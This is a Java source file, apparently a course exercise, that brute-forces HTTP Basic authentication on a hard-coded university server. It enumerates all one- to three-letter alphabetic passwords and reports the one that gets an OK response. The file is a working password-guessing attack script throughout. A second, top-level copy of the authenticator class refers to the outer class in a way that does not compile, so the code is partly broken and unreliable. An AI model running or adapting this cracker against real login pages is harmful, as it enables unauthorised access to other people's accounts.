import java.net.PasswordAuthentication;
import java.io.IOException;
import java.net.URL;
import java.net.HttpURLConnection;
import java.net.Authenticator;
import java.util.Vector;
public class BruteForce {
    boolean f00;
    int f10;
    String[] f20;
    Vector f30;
    BruteForce() {
        this.f00 = false;
        this.f20 = new String[] { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" };
        this.f30 = new Vector();
        this.f10 = 0;
        this.m10();
        this.m00();
    }
    public void m00() {
        while ( this.f10 < this.f30.size() ) {
            this.f00 = this.m20();
            if ( this.f00 ) {
                System.out.print ( "The password is: " );
                System.out.println ( this.f30.elementAt ( this.f10 - 1 ) );
                this.f10 = this.f30.size();
            }
        }
    }
    public void m10() {
        final String s = new String();
        for ( int i = 0; i < 52; ++i ) {
            this.f30.addElement ( this.f20[i] );
        }
        for ( int j = 0; j < 52; ++j ) {
            for ( int k = 0; k < 52; ++k ) {
                this.f30.addElement ( this.f20[j] + this.f20[k] );
            }
        }
        for ( int l = 0; l < 52; ++l ) {
            for ( int n = 0; n < 52; ++n ) {
                for ( int n2 = 0; n2 < 52; ++n2 ) {
                    this.f30.addElement ( this.f20[l] + this.f20[n] + this.f20[n2] );
                }
            }
        }
    }
    public boolean m20() {
        Authenticator.setDefault ( new MyAuthenticator() );
        try {
            final HttpURLConnection httpURLConnection = ( HttpURLConnection ) new URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).openConnection();
            httpURLConnection.connect();
            if ( httpURLConnection.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( IOException ex ) {}
        return false;
    }
    public static void main ( final String[] array ) {
        final BruteForce bruteForce = new BruteForce();
    }
    class MyAuthenticator extends Authenticator {
        @Override
        protected PasswordAuthentication getPasswordAuthentication() {
            final String s = "";
            final String s2 = BruteForce.this.f30.elementAt ( BruteForce.this.f10 );
            ++BruteForce.this.f10;
            return new PasswordAuthentication ( s, s2.toCharArray() );
        }
    }
}
class MyAuthenticator extends Authenticator {
    @Override
    protected PasswordAuthentication getPasswordAuthentication() {
        final String s = "";
        final String s2 = BruteForce.this.f30.elementAt ( BruteForce.this.f10 );
        ++BruteForce.this.f10;
        return new PasswordAuthentication ( s, s2.toCharArray() );
    }
}
